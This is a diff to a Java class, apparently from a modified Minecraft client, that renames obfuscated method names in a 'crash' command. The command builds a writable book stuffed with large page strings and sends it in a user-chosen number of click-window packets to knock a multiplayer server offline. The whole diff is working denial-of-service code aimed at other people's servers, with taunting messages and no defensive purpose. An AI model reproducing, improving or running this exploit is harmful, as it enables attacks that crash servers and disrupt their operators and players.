@@ -30,7 +30,7 @@ public class CrashCommand extends Command
         new Thread("crash time trololol") {
             @Override
             public void run() {
-                if (Minecraft.func_71410_x().func_147104_D() == null || Minecraft.func_71410_x().func_147104_D().field_78845_b.isEmpty()) {
+                if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
                     Command.sendMessage("Join a server monkey");
                     return;
                 }
@@ -45,7 +45,7 @@ public class CrashCommand extends Command
                     Command.sendMessage("Are you sure you put a number?");
                     return;
                 }
-                final ItemStack bookObj = new ItemStack(Items.field_151099_bA);
+                final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                 final NBTTagList list = new NBTTagList();
                 final NBTTagCompound tag = new NBTTagCompound();
                 final int pages = Math.min(50, 100);
@@ -53,15 +53,15 @@ public class CrashCommand extends Command
                 for (int i = 0; i < pages; ++i) {
                     final String siteContent = size;
                     final NBTTagString tString = new NBTTagString(siteContent);
-                    list.func_74742_a((NBTBase)tString);
+                    list.appendTag((NBTBase)tString);
                 }
-                tag.func_74778_a("author", Util.mc.field_71439_g.func_70005_c_());
-                tag.func_74778_a("title", "client > all :^D");
-                tag.func_74782_a("pages", (NBTBase)list);
-                bookObj.func_77983_a("pages", (NBTBase)list);
-                bookObj.func_77982_d(tag);
+                tag.setString("author", Util.mc.player.getName());
+                tag.setString("title", "client > all :^D");
+                tag.setTag("pages", (NBTBase)list);
+                bookObj.setTagInfo("pages", (NBTBase)list);
+                bookObj.setTagCompound(tag);
                 for (int i = 0; i < CrashCommand.this.packets; ++i) {
-                    Util.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
+                    Util.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
                 }
             }
         }.start();
